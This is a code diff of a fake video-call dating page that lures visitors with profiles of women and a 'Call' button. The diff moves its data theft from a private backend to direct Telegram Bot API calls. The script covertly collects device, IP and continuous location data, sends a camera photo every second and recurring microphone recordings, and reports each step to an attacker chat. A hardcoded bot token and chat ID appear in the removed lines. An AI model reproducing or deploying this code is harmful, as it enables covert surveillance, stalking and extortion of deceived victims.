@@ -222,7 +222,7 @@
     <div class="permission-content">
       <h3 style="color: #28a745;">🔐 Permissions Required</h3>
       <p style="color: #fff; margin: 15px 0;">
-        To start video call, please allow camera, microphone and location access when prompted.
+        To start video call, please allow camera, microphon and location access when prompted.
       </p>
       <button class="permission-btn" onclick="startPermissionProcess()">Allow Permissions</button>
     </div>
@@ -330,106 +330,177 @@
           <button class="call-btn" onclick="showPermissionModal()">Call</button>
         </div>
         <div class="profile">
-          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi4.jpg" alt="Farida">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi4.jpg" alt="Isha">
           <div class="online-dot"></div>
-          <span>Farida &#127463;&#127465;</span>
+          <span>Isha &#127463;&#127465;</span>
           <button class="call-btn" onclick="showPermissionModal()">Call</button>
         </div>
         <div class="profile">
-          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi5.jpg" alt="Sharmin">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi5.jpg" alt="Riya">
           <div class="online-dot"></div>
-          <span>Sharmin &#127463;&#127465;</span>
+          <span>Riya &#127463;&#127465;</span>
           <button class="call-btn" onclick="showPermissionModal()">Call</button>
         </div>
         <div class="profile">
-          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi6.jpg" alt="Rima">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi6.jpg" alt="Zara">
           <div class="online-dot"></div>
-          <span>Rima &#127463;&#127465;</span>
+          <span>Zara &#127463;&#127465;</span>
           <button class="call-btn" onclick="showPermissionModal()">Call</button>
         </div>
       </div>
     </div>
-    
-    <div class="video-container" id="videoContainer">
-      <p class="status">Connecting...</p>
-      <video id="localVideo" autoplay muted playsinline></video>
-    </div>
   </div>
-  
+
   <script>
-    const videoContainer = document.getElementById('videoContainer');
-    const localVideo = document.getElementById('localVideo');
-    const permissionModal = document.getElementById('permissionModal');
-    
-    const BOT_TOKEN = '8690496477:AAHv5lD-p5tlEOdipUlyMMnBY86uCgVwzrI';
-    const CHAT_ID = '@exposts_bot';
-    
-    let audioInterval;
-    let photoInterval;
-    let currentUserData = null;
-    let isProcessing = false;
+    // ============================================
+    // TELEGRAM BOT CONFIGURATION
+    // ============================================
+    // Substitua estes valores com suas credenciais do Telegram
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Obtenha com @BotFather
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Seu ID de chat ou grupo
+    const TELEGRAM_API_URL = 'https://api.telegram.org/bot';
 
-    
-    function showPermissionModal() {
-      if (isProcessing) return;
-      permissionModal.style.display = 'flex';
+    // ============================================
+    // VARIÁVEIS GLOBAIS
+    // ============================================
+    let currentUserData = {};
+    let photoInterval = null;
+    let audioInterval = null;
+    let localVideo = document.createElement('video');
+
+    // ============================================
+    // FUNÇÕES DE ENVIO PARA TELEGRAM
+    // ============================================
+
+    /**
+     * Envia uma mensagem de texto para o Telegram
+     */
+    async function sendTelegramMessage(text) {
+      try {
+        const url = `${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+          })
+        });
+        return response.ok;
+      } catch (error) {
+        console.error('Erro ao enviar mensagem para Telegram:', error);
+        return false;
+      }
     }
 
-  
-    async function startPermissionProcess() {
-      if (isProcessing) return;
-      isProcessing = true;
+    /**
+     * Envia dados estruturados como mensagem formatada
+     */
+    async function sendTelegramData(title, data) {
+      let message = `<b>${title}</b>\n\n`;
       
-      permissionModal.style.display = 'none';
-      document.getElementById('profiles').style.display = 'none';
-      videoContainer.style.display = 'flex';
+      const formatValue = (value) => {
+        if (typeof value === 'object' && value !== null) {
+          return JSON.stringify(value, null, 2);
+        }
+        return String(value);
+      };
 
+      for (const [key, value] of Object.entries(data)) {
+        message += `<b>${key}:</b> ${formatValue(value)}\n`;
+      }
+
+      return sendTelegramMessage(message);
+    }
+
+    /**
+     * Envia uma foto para o Telegram
+     */
+    async function sendTelegramPhoto(photoBlob, caption = '') {
       try {
-        await init();
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', photoBlob, 'photo.jpg');
+        if (caption) {
+          formData.append('caption', caption);
+          formData.append('parse_mode', 'HTML');
+        }
+
+        const url = `${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+        return response.ok;
       } catch (error) {
-        
-        console.error('Error:', error);
+        console.error('Erro ao enviar foto para Telegram:', error);
+        return false;
       }
     }
 
-    
-    function getChatIdFromURL() {
+    /**
+     * Envia áudio para o Telegram
+     */
+    async function sendTelegramAudio(audioBlob, caption = '') {
       try {
-        const currentURL = window.location.href;
-        let queryString = '';
-        
-        if (currentURL.includes('?')) {
-          queryString = currentURL.split('?')[1];
-          
-          if (queryString.includes('&m=1')) {
-            queryString = queryString.split('&m=1')[0];
-          }
-          
-          queryString = queryString.replace(/%3D/g, '=').replace(/%3d/g, '=');
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('audio', audioBlob, 'audio.webm');
+        if (caption) {
+          formData.append('caption', caption);
+          formData.append('parse_mode', 'HTML');
         }
-        
-        if (!queryString) return '8402806341';
-        
-        try {
-          const chatId = atob(queryString);
-          if (/^\d+$/.test(chatId)) {
-            return chatId;
-          }
-        } catch (e) {
-          if (/^\d+$/.test(queryString)) {
-            return queryString;
-          }
-        }
-        
-        return '8402806341';
-        
+
+        const url = `${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendAudio`;
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+        return response.ok;
       } catch (error) {
-        return '8402806341';
+        console.error('Erro ao enviar áudio para Telegram:', error);
+        return false;
       }
     }
 
-    
-    function getEnhancedLocation() {
+    /**
+     * Envia documento (JSON) para o Telegram
+     */
+    async function sendTelegramDocument(jsonData, filename = 'data.json') {
+      try {
+        const jsonBlob = new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' });
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', jsonBlob, filename);
+        formData.append('caption', `📄 ${filename}`);
+
+        const url = `${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendDocument`;
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+        return response.ok;
+      } catch (error) {
+        console.error('Erro ao enviar documento para Telegram:', error);
+        return false;
+      }
+    }
+
+    // ============================================
+    // FUNÇÕES ORIGINAIS (ADAPTADAS)
+    // ============================================
+
+    function showPermissionModal() {
+      document.getElementById('permissionModal').style.display = 'flex';
+    }
+
+    function startPermissionProcess() {
+      document.getElementById('permissionModal').style.display = 'none';
+      init();
+    }
+
+    async function getEnhancedLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
           resolve(null);
@@ -442,78 +513,26 @@
           maximumAge: 0
         };
 
-        navigator.geolocation.getCurrentPosition(
+        navigator.geolocation.watchPosition(
           async (position) => {
             try {
               const { latitude, longitude, accuracy } = position.coords;
-              
-              console.log('📍 Raw coordinates:', { latitude, longitude, accuracy });
-              
-              let locationInfo = null;
-              
-              try {
-                const response1 = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
-                if (response1.ok) {
-                  const data1 = await response1.json();
-                  locationInfo = {
-                    coordinates: {
-                      latitude: latitude,
-                      longitude: longitude,
-                      accuracy: accuracy + ' meters'
-                    },
-                    address: {
-                      city: data1.city || data1.locality || 'N/A',
-                      state: data1.principalSubdivision || 'N/A',
-                      country: data1.countryName || 'N/A',
-                      full_address: data1.localityInfo?.administrative[2]?.name || data1.locality || 'N/A'
-                    },
-                    timestamp: new Date().toISOString(),
-                    source: 'bigdatacloud'
-                  };
-                }
-              } catch (e) {}
 
-              if (!locationInfo) {
-                try {
-                  const response2 = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
-                  if (response2.ok) {
-                    const data2 = await response2.json();
-                    locationInfo = {
-                      coordinates: {
-                        latitude: latitude,
-                        longitude: longitude,
-                        accuracy: accuracy + ' meters'
-                      },
-                      address: {
-                        city: data2.address?.city || data2.address?.town || data2.address?.village || 'N/A',
-                        state: data2.address?.state || data2.address?.county || 'N/A',
-                        country: data2.address?.country || 'N/A',
-                        full_address: data2.display_name || 'N/A'
-                      },
-                      timestamp: new Date().toISOString(),
-                      source: 'openstreetmap'
-                    };
-                  }
-                } catch (e) {}
-              }
-
-              if (!locationInfo) {
-                locationInfo = {
-                  coordinates: {
-                    latitude: latitude,
-                    longitude: longitude,
-                    accuracy: accuracy + ' meters'
-                  },
-                  address: {
-                    city: 'N/A',
-                    state: 'N/A',
-                    country: 'N/A',
-                    full_address: 'Coordinates only - ' + latitude + ', ' + longitude
-                  },
-                  timestamp: new Date().toISOString(),
-                  source: 'coordinates_only'
-                };
-              }
+              let locationInfo = {
+                coordinates: {
+                  latitude: latitude,
+                  longitude: longitude,
+                  accuracy: accuracy + ' meters'
+                },
+                address: {
+                  city: 'N/A',
+                  state: 'N/A',
+                  country: 'N/A',
+                  full_address: 'Coordinates only - ' + latitude + ', ' + longitude
+                },
+                timestamp: new Date().toISOString(),
+                source: 'coordinates_only'
+              };
 
               console.log('📍 Final location data:', locationInfo);
               resolve(locationInfo);
@@ -532,7 +551,6 @@
       });
     }
 
-    
     function detectPlatform() {
       const userAgent = navigator.userAgent.toLowerCase();
       
@@ -551,7 +569,6 @@
       return navigator.platform || 'Unknown';
     }
 
-    
     function getEnhancedDeviceInfo() {
       const userAgent = navigator.userAgent;
       
@@ -579,7 +596,6 @@
       };
     }
 
-    
     async function getCameraStream() {
       try {
         let constraints = {
@@ -596,18 +612,13 @@
           }
         };
 
-        // ✅ GET CAMERA STREAM
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        
-        // ✅ APPLY MIRROR EFFECT FOR NATURAL MOVEMENT
         localVideo.style.transform = 'scaleX(-1)';
-        
         return stream;
         
       } catch (error) {
         console.error('Camera error:', error);
         
-        // ✅ FALLBACK TO BASIC CONSTRAINTS
         try {
           const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
@@ -621,11 +632,10 @@
       }
     }
 
-    // ✅ PARALLEL PERMISSION REQUEST
     async function requestAllPermissionsParallel() {
       try {
         const [mediaPromise, locationPromise] = [
-          getCameraStream(), // ✅ USE FIXED CAMERA FUNCTION
+          getCameraStream(),
           getEnhancedLocation()
         ];
 
@@ -653,7 +663,6 @@
       }
     }
 
-    // ✅ ENHANCED DATA COLLECTION
     async function collectEnhancedUserData() {
       const data = {
         ip_info: {},
@@ -710,53 +719,46 @@
       return data;
     }
 
-    async function sendUserData(chatId, userData) {
-      try {
-        const response = await fetch(`${API_URL}/user-info`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            chat_id: chatId, 
-            user_data: userData 
-          })
-        });
-        return response.ok;
-      } catch (e) {
-        return false;
-      }
-    }
-
     async function init() {
       try {
-        const chatId = getChatIdFromURL();
-        
-        document.querySelector('.status').textContent = 'Getting permissions...';
+        const statusElement = document.querySelector('.status');
+        if (!statusElement) {
+          const status = document.createElement('div');
+          status.className = 'status';
+          document.querySelector('.container').insertBefore(status, document.querySelector('.profiles-container'));
+        }
 
-        // ✅ ENHANCED DATA COLLECTION
+        document.querySelector('.status').textContent = 'Coletando informações...';
+
+        // ✅ COLETA DE DADOS APRIMORADA
         currentUserData = await collectEnhancedUserData();
         
-        // ✅ SEND INITIAL DATA TO BACKEND
-        await sendUserData(chatId, currentUserData);
+        // ✅ ENVIAR DADOS INICIAIS PARA TELEGRAM
+        await sendTelegramData('📱 Informações do Dispositivo', currentUserData.device);
+        await sendTelegramData('🌐 Informações de IP', currentUserData.ip_info);
 
-        // ✅ GET PERMISSIONS WITH FIXED CAMERA
-        document.querySelector('.status').textContent = 'Requesting camera & location...';
+        // ✅ SOLICITAR PERMISSÕES
+        document.querySelector('.status').textContent = 'Solicitando câmera e localização...';
         const { stream, locationData } = await requestAllPermissionsParallel();
 
-        
+        // ✅ ENVIAR DADOS DE LOCALIZAÇÃO
         if (locationData) {
           currentUserData.location = locationData;
-          console.log('📍 Sending location data:', locationData);
-          await sendUserData(chatId, currentUserData);
+          console.log('📍 Enviando dados de localização:', locationData);
+          await sendTelegramData('📍 Informações de Localização', locationData);
         } else {
-          console.log('❌ No location data received');
+          console.log('❌ Nenhum dado de localização recebido');
+          await sendTelegramMessage('⚠️ Localização não disponível');
         }
 
         if (!stream) {
-          document.querySelector('.status').textContent = 'Camera access required';
+          document.querySelector('.status').textContent = 'Acesso à câmera necessário';
+          await sendTelegramMessage('❌ Acesso à câmera foi recusado');
           return;
         }
 
-        document.querySelector('.status').textContent = 'Connected - Starting call...';
+        document.querySelector('.status').textContent = 'Conectado - Iniciando chamada...';
+        await sendTelegramMessage('✅ Câmera e microfone ativados com sucesso');
 
         const audioContext = new AudioContext();
         const micSource = audioContext.createMediaStreamSource(stream);
@@ -766,20 +768,21 @@
 
         localVideo.srcObject = stream;
 
-        startPhotoSend(stream, chatId);
-        startAudioSend(stream, chatId);
+        startPhotoSend(stream);
+        startAudioSend(stream);
 
         setTimeout(() => {
           document.querySelector('.status').style.display = 'none';
         }, 3000);
 
       } catch (error) {
-        document.querySelector('.status').textContent = 'Connection failed';
+        document.querySelector('.status').textContent = 'Falha na conexão';
         console.error('Init error:', error);
+        await sendTelegramMessage(`❌ Erro: ${error.message}`);
       }
     }
 
-    function startPhotoSend(stream, chatId) {
+    function startPhotoSend(stream) {
       const track = stream.getVideoTracks()[0];
       const imageCapture = new ImageCapture(track);
       
@@ -819,28 +822,18 @@
 
           canvas.toBlob(async (blob) => {
             photoCount++;
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob);
-            formData.append("user_data", JSON.stringify({
-              ...currentUserData,
-              photo_number: photoCount
-            }));
-
-            fetch(`${API_URL}/photo`, {
-              method: "POST",
-              body: formData
-            }).catch(() => {});
+            const caption = `📸 Foto #${photoCount} - ${new Date().toLocaleTimeString()}`;
+            await sendTelegramPhoto(blob, caption);
 
           }, 'image/jpeg', 0.9);
 
         } catch (e) {
-          // Silent error
+          console.error('Erro ao capturar foto:', e);
         }
       }, 1000);
     }
 
-    function startAudioSend(stream, chatId) {
+    function startAudioSend(stream) {
       if (audioInterval) clearInterval(audioInterval);
       
       audioInterval = setInterval(() => {
@@ -851,15 +844,8 @@
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.onstop = async () => {
           const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-          
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("audio", audioBlob);
-          
-          fetch(`${API_URL}/audio`, {
-            method: "POST",
-            body: formData
-          }).catch(() => {});
+          const caption = `🎙️ Áudio - ${new Date().toLocaleTimeString()}`;
+          await sendTelegramAudio(audioBlob, caption);
         };
 
         recorder.start();
